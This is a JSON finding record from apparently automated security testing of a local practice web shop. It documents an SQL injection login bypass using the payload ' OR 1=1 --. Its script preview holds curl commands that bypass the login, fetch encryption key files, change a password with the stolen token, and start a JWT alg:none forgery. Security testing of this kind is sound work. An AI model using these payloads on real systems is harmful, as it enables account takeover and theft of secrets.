@@ -1,0 +1,24 @@
+{
+  "id": "ev_1784845749485_535ff8",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "SQL Injection in Login Endpoint (Auth Bypass) @ http://127.0.0.1:3010/rest/user/login",
+  "data": {
+    "kind": "proof",
+    "observation": "Proof: POST /rest/user/login with body {\"email\":\"' OR 1=1 --\",\"password\":\"test\"} returns HTTP 200 with JSON containing token, bid, and email fields. In contrast, invalid credentials return HTTP 401 with {\"error\":\"Invalid email or password\"}. This demonstrates SQL injection authentication bypass. The SQLi payload causes the query to return the first user (admin) regardless of password.",
+    "proof": "Proof: POST /rest/user/login with body {\"email\":\"' OR 1=1 --\",\"password\":\"test\"} returns HTTP 200 with JSON containing token, bid, and email fields. In contrast, invalid credentials return HTTP 401 with {\"error\":\"Invalid email or password\"}. This demonstrates SQL injection authentication bypass. The SQLi payload causes the query to return the first user (admin) regardless of password.",
+    "path_or_url": "http://127.0.0.1:3010/rest/user/login",
+    "location": "http://127.0.0.1:3010/rest/user/login",
+    "title": "SQL Injection in Login Endpoint (Auth Bypass)",
+    "stdout": "Proof: POST /rest/user/login with body {\"email\":\"' OR 1=1 --\",\"password\":\"test\"} returns HTTP 200 with JSON containing token, bid, and email fields. In contrast, invalid credentials return HTTP 401 with {\"error\":\"Invalid email or password\"}. This demonstrates SQL injection authentication bypass. The SQLi payload causes the query to return the first user (admin) regardless of password.",
+    "body_preview": "Proof: POST /rest/user/login with body {\"email\":\"' OR 1=1 --\",\"password\":\"test\"} returns HTTP 200 with JSON containing token, bid, and email fields. In contrast, invalid credentials return HTTP 401 with {\"error\":\"Invalid email or password\"}. This demonstrates SQL injection authentication bypass. The SQLi payload causes the query to return the first user (admin) regardless of password.",
+    "capture_via": "write",
+    "how_captured": "script: tmp/test_requests.sh",
+    "script_path": "tmp/test_requests.sh",
+    "path": "tmp/test_requests.sh",
+    "script_preview": "#!/bin/bash\n# Test key candidate claims\n\necho \"=== 1. Login SQLi bypass ===\"\ncurl -s -X POST http://127.0.0.1:3010/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op' -- -'\",\"password\":\"test\"}' | head -c 300\necho \"\"\n\necho \"=== 2. Login normal failure ===\"\ncurl -s -X POST http://127.0.0.1:3010/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"invalid@test.com\",\"password\":\"wrong\"}' | head -c 300\necho \"\"\n\necho \"=== 3. Login SQLi with UNION ===\"\ncurl -s -X POST http://127.0.0.1:3010/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"' OR 1=1 --\\\",\\\"password\\\":\\\"test\\\"}\" | head -c 300\necho \"\"\n\necho \"=== 4. Login with admin' -- ===\"\ncurl -s -X POST http://127.0.0.1:3010/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"admin@juice-sh.op' --\\\",\\\"password\\\":\\\"test\\\"}\" | head -c 300\necho \"\"\n\necho \"=== 5. Memories endpoint ===\"\ncurl -s http://127.0.0.1:3010/rest/memories | head -c 500\necho \"\"\n\necho \"=== 6. Encryption keys directory ===\"\ncurl -s http://127.0.0.1:3010/encryptionkeys/\necho \"\"\n\necho \"=== 7. JWT public key ===\"\ncurl -s http://127.0.0.1:3010/encryptionkeys/jwt.pub\necho \"\"\n\necho \"=== 8. Premium key ===\"\ncurl -s http://127.0.0.1:3010/encryptionkeys/premium.key\necho \"\"\n\necho \"=== 9. FTP directory ===\"\ncurl -s http://127.0.0.1:3010/ftp/ | head -c 500\necho \"\"\n\necho \"=== 10. Change password without current ===\"\nTOKEN=$(curl -s -X POST http://127.0.0.1:3010/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"' OR 1=1 --\",\"password\":\"test\"}' 2>/dev/null | python3 -c \"import sys,json;print(json.load(sys.stdin).get('token',''))\" 2>/dev/null)\necho \"Token: $TOKEN\"\ncurl -s -X GET \"http://127.0.0.1:3010/rest/user/change-password?new=test123&repeat=test123\" -H \"Authorization: Bearer $TOKEN\" | head -c 300\necho \"\"\n\necho \"=== 11. JWT alg:none test ===\"\n# Generate a simple JWT with alg:none\npython3 -c \"\nimport base64, json\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'none','ty…",
+    "source_tool_act": "write",
+    "act_summary": "source/material tmp/test_requests.sh"
+  },
+  "created_at": "2026-07-23T22:29:09.485Z"
+}
